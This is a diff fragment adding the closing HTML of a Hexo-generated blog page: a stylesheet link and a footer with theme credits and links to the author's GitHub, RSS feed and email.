+<link rel="stylesheet" href="/css/o3o.css">
+
+</main>
+    <footer>
+  <div class="footer-info"> Powerd by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> | Theme <a
+      target="_blank" rel="noopener" href="https://github.com/mizoreyo/hexo-theme-insnow">Insnow</a> </div>
+  <div class="footer-info">
+    <a class="footer-i" href=""><i class="iconfont icon-wechat"></i></a>
+    <a class="footer-i" target="_blank" rel="noopener" href="https://github.com/sammyLingsj"><i class="iconfont icon-github-fill"></i></a>
+    <a class="footer-i" href="/atom.xml"><i class="iconfont icon-rss"></i></a>
+    <a class="footer-i" href="mailto:sammyLinsj@outlook.com"><i class="iconfont icon-mail"></i></a>
+  </div>
+</footer>
+  </div>
+</body>
+
+
+</html>
